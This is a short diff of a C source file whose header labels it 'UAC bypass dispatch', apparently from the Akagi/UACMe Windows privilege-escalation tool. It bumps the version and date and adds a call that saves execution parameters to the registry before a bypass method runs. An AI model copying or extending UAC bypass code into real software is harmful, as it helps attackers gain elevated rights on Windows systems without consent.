@@ -4,9 +4,9 @@
 *
 *  TITLE:       METHODS.C
 *
-*  VERSION:     2.79
+*  VERSION:     2.80
 *
-*  DATE:        16 Aug 2017
+*  DATE:        31 Aug 2017
 *
 *  UAC bypass dispatch.
 *
@@ -162,9 +162,15 @@ BOOL IsMethodMatchRequirements(
     }
 #endif
     //
-    // Set optional parameter if method support it.
+    // Set shared registry parameters.
     //
-    if (Entry->SetParameterInRegistry) {
+    //   1. Execution parameters (flag, session id, winstation\desktop)
+    //   2. Optional parameter from Akagi command line.
+    //
+    if (Entry->SetParametersInRegistry) {
+
+        supSaveAkagiParameters();
+
         if (g_ctx.OptionalParameterLength != 0) {
             supSetParameter(
                 (LPWSTR)&g_ctx.szOptionalParameter,
